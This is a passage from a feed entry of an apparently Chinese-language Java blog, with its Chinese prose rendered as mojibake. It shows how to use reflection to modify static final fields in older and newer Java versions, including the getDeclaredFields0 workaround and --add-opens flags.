class="hljs-string">&quot;ceshi6&quot;</span>);<br>        System.out.println(test1.STR2);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410041125726.png" alt="image-20241004101525466"></p><p>è¿™ä¸¤ç§æ–¹æ³•æˆ‘ä»¬éƒ½å¯ä»¥é˜²æ­¢å…¶è¢«å¸¸é‡åŒ–</p><h2 id="ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡"><a href="#ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡" class="headerlink" title="ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡"></a>ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡</h2><p>æ­¤æ—¶é€šè¿‡å¸¸è§„åå°„çš„å†™æ³•å°±ä¼šæŠ¥é”™ï¼Œå¦‚æœæˆ‘ä»¬è¦ä¿®æ”¹çš„è¯å°±éœ€è¦å…ˆå»é™¤finalä¿®é¥°ç¬¦æ‰è¡Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//åå°„åŒæ—¶ä¿®æ”¹staticå’Œfinalä¿®é¥°çš„å˜é‡</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> name11.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);<span class="hljs-comment">//è·å–modifierså­—æ®µ</span><br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//å»é™¤finalä¿®é¥°ç¬¦</span><br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<span class="hljs-comment">//å°†finalä¿®é¥°ç¬¦è®¾ç½®å›æ¥</span><br>        System.out.println(test1.name1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç”¨modifierså­—æ®µå»é™¤finalä¿®é¥°ç¬¦å³å¯ä¿®æ”¹ã€‚</p><blockquote><p> <code>Field</code> ç±»ä¸­çš„ <code>modifiers</code> å­—æ®µã€‚è¿™ä¸ªå­—æ®µæ˜¯ä¸€ä¸ª <code>int</code> ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºè¯¥å­—æ®µçš„ä¿®é¥°ç¬¦ï¼ˆå¦‚ <code>public</code>ã€<code>private</code>ã€<code>final</code> ç­‰ï¼‰ï¼Œè¯¥å­—æ®µæ˜¯ä¸€ä¸ªç§æœ‰å­—æ®µã€‚</p><p><code>Modifier.FINAL</code> æ˜¯ä¸€ä¸ªå¸¸é‡ï¼Œè¡¨ç¤º <code>final</code> ä¿®é¥°ç¬¦çš„ä½æ©ç ã€‚</p></blockquote><h1 id="é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"><a href="#é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic" class="headerlink" title="é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic"></a>é«˜ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic</h1><p>å…¶ä»–çš„åå°„ä¿®æ”¹éƒ½æ²¡æœ‰å˜åŒ–ï¼Œå°±æ˜¯ä¿®æ”¹åŒæ—¶è¢«finalå’Œstaticä¿®é¥°çš„å˜é‡çš„æ–¹æ³•ä»Java12å¼€å§‹å¤±æ•ˆäº†ï¼Œæˆ‘åœ¨java17æµ‹è¯•æ˜¯ç›´æ¥æ²¡æœ‰modifiersè¿™ä¸ªå­—æ®µäº†ã€‚è¿™æ˜¯å› ä¸ºé«˜ç‰ˆæœ¬ä¸‹ä¸èƒ½é€šè¿‡getDeclaredFiledè·å–Fieldçš„å±æ€§ã€‚</p><p>è¿™ä¸€ç‚¹å¯ä»¥ä»fieldFilterMapé‡Œé¢çŸ¥é“</p><p><img src="https://cdn.clown2024.cn/202410041125763.png" alt="image-20241004105355114"></p><p>å›¾ä¸­è¢«è¿‡æ»¤çš„ç±»éƒ½ä¸èƒ½ç›´æ¥é€šè¿‡å…¬å…±åå°„è·å–ä»–ä»¬çš„å±æ€§äº†ï¼Œæˆ‘ä»¬çš„Fieldç±»å°±åœ¨å…¶ä¸­ã€‚</p><p>é‚£å°±éœ€è¦æ”¹ä¸€æ”¹æ–¹æ³•äº†ï¼Œè¿™ç§æ–¹æ³•å¯¹java8-java17éƒ½æ˜¯é€‚ç”¨çš„ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/wu_weijie/article/details/129251045">https://blog.csdn.net/wu_weijie/article/details/129251045</a></p><p>æˆ‘ä»¬å¯ä»¥æ”¹æˆç”¨<strong>getDeclaredFields0</strong>æ–¹æ³•æ¥è·å–ï¼Œä»æ–‡ç« ä¸­å¯ä»¥çŸ¥é“ä»–èƒ½è¿”å›ä¸€ä¸ªFieldæ•°ç»„å¯¹è±¡ï¼Œé‡Œé¢å°±åŒ…å«äº†æˆ‘ä»¬çš„modifierså±æ€§</p><p>é‚£æˆ‘ä»¬çš„ä¿®æ”¹ä»£ç å°±å¯ä»¥æ”¹æˆä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown;<br><br><br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.lang.reflect.Modifier;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">name1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;default7&quot;</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Test1</span> <span class="hljs-variable">test1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test1</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">test1Class</span> <span class="hljs-operator">=</span> Test1.class;<br><br>        <span class="hljs-comment">//é«˜ç‰ˆæœ¬åå°„åŒæ—¶ä¿®æ”¹staticå’Œfinalä¿®é¥°çš„å˜é‡</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getDeclaredFields0</span> <span class="hljs-operator">=</span> Class.class.getDeclaredMethod(<span class="hljs-string">&quot;getDeclaredFields0&quot;</span>, <span class="hljs-type">boolean</span>.class);<br>        getDeclaredFields0.setAccessible(<span class="hljs-literal">true</span>);<br>        Field[] fields = (Field[]) getDeclaredFields0.invoke(Field.class, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">modifiers</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">for</span> (Field each : fields) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;modifiers&quot;</span>.equals(each.getName())) &#123;<br>                modifiers = each;<br>            &#125;<br>        &#125;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name11</span> <span class="hljs-operator">=</span> test1Class.getDeclaredField(<span class="hljs-string">&quot;name1&quot;</span>);<br>        name11.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setAccessible(<span class="hljs-literal">true</span>);<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        name11.set(test1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">&quot;ceshi7&quot;</span>));<br>        modifiers.setInt(name11, name11.getModifiers() &amp; ~Modifier.FINAL);<br>        System.out.println(test1.name1);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬è¿è¡Œçš„æ—¶å€™è¿˜éœ€è¦æ·»åŠ æ¨¡å—ï¼Œå› ä¸ºjava12çš„é«˜ç‰ˆæœ¬æ˜¯æ¨¡å—åŒ–çš„ï¼Œåœ¨vm-optionsæ·»åŠ ä¿®æ”¹å³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.lang.reflect=ALL-UNNAMED<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic&quot;&gt;&lt;a href=&quot;#ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic&quot; class=&quot;headerlink&quot; title=&quot;ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic&quot;&gt;&lt;/a&gt;ä½ç‰ˆæœ¬ä¿®æ”¹finalå’Œstatic&lt;/h1&gt;&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a hr</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="åŸºç¡€" scheme="https://clowsman.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
</feed>
